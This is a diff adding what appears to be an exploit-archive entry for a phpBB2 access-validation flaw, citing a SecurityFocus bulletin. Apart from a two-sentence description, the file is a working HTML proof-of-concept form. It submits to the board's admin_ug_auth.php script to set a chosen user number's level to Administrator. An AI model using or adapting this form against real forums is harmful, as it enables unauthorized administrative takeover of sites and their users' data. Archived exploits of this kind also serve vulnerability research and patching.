@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/22730/info
+
+PHPBB2 is prone to a vulnerability that will let attackers gain administrative access to the application because it fails to properly validate access.
+
+Successful exploits may result in a complete compromise of vulnerable applications. 
+
+<html>
+<head>
+</head>
+<body>
+
+<form method="post"
+action="www.example.com/board_directory/admin/admin_ug_auth.php">
+User Level: <select name="userlevel">
+<option value="admin">Administrator</option>
+<option value="user">User</option></select>
+<input type="hidden" name="private[1]" value="0">
+<input type="hidden" name="moderator[1]" value="0">
+<input type="hidden" name="mode" value="user">
+<input type="hidden" name="adv" value="">
+User Number: <input type="text" name="u" size="5">
+<input type="submit" name="submit" value="Submit">
+
+</form>
+</body>
+</html> 
